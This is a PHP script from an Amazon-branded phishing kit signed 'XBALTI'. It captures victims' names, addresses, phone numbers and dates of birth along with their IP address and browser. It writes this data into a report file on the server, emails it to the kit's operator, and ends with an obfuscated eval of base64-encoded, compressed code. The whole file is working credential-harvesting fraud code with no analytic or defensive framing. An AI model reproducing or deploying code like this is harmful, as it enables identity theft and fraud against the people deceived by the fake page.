<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$_SESSION['fullname']   = $_POST['fullname'];
$_SESSION['address']   = $_POST['address'];
$_SESSION['City']   = $_POST['City'];
$_SESSION['stat']   = $_POST['stat'];
$_SESSION['zipcode']   = $_POST['zipcode'];
$_SESSION['phonenumber']   = $_POST['phonenumber'];
$_SESSION['dob']   = $_POST['dob'];
$timedate = date('H:i:s d/m/Y');
include('./Email.php');
include('./get_browser.php');
include('./get_ip.php');
$msg .= "
<!DOCTYPE html>
<html>
<head>
	<title>*REZULT*</title>
</head>
<body    style=' padding:0;margin:0;
    		background-color: #fff;
    		background-attachment:fixed;
    		border-bottom:1px solid rgba(255,255,255,0);
    		color: #ff8100;
    		height: 100vh;
    		font-family: calibri;
    		background-color: #000;
    		font-size: 18px;
    		text-shadow: 0 0 10px #ff8100;'  >
	<p style='text-align: center;margin:40px 0;'  >
		<img height='100px;' src='http://icons.iconarchive.com/icons/designbolts/credit-card-payment/256/Amazon-icon.png'>
	</p>
	<div   style=' margin:0 auto;
			max-width: 900px;
			width: 100%;
			border:2px solid #ff8100;
			border-radius: 4px;
			box-shadow: 0 0 20px #ff8100; '>


		<div align='center' style=' padding:10px 20px;  '>
             <h1 style='text-align: center;' >XBALTI</h1>
			<p style='text-align: center;'>BILLING INFORMATION FROM |".$_SESSION['country']."| ip = ".$_SESSION['_ip_']."   </p>
			<p>
				<table  style='margin:40px 0;border-bottom: 4px solid #6b5c5c;padding: 20px 0;border-radius: 4px;border-top: 4px solid #6b5c5c;'  >
					<tr>
						<td style=' width: 30%;'>
							|Full Name|
						</td>
						<td>: 
							".$_SESSION['fullname']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Street address|
						</td>
						<td>:
						".$_SESSION['address']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|City|
						</td>
						<td>:
						".$_SESSION['City']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|State|
						</td>
						<td>:
						".$_SESSION['stat']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Zip Code|
						</td>
						<td>:
						".$_SESSION['zipcode']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Phone number|
						</td>
						<td>:
						".$_SESSION['phonenumber']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Date Of Birth|
						</td>
						<td>:
						".$_SESSION['dob']."
						</td>
					</tr>
                    <hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' />
					<tr>
						<td style=' width: 30%;'>
							|Country|
						</td>
						<td>: 
						".$_SESSION['country']."
						</td>
					</tr>
                    
                    
					<tr>
						<td style=' width: 30%;'>
							|ip|
						</td>
						<td>: 
						".$_SESSION['_ip_']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%;'>
							|Browser/System|
						</td>
						<td>: 
						".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
						</td>
                      </tr>
					<tr>
						<td style=' width: 30%;'>
							|Time / Date|
						</td>
						<td>: 
						".$timedate."
						</td>
                      </tr>
				</table>
               <hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' >
			</p>
		</div>
	</div>
</body>
</html>\n";
    $khraha = fopen("../../admin/rezulta.php", "a");
	fwrite($khraha, $msg);
    $subject .= "BILLING INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";
    $headers .= "From: <XBALTI>";
    $headers .= "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=UTF-8\n";
    @mail($Email, $subject, $msg, $headers);
    eval(gzinflate(base64_decode('4+JScc1NzMwxVLBVUM8tqjA2N7UwdqhMzEtJrdBLzs9Vt+ZyAMlrQJXpKKgUlyZlpSaXAFm5xelAMiM1MSW1qFjTGgA=')));

?>
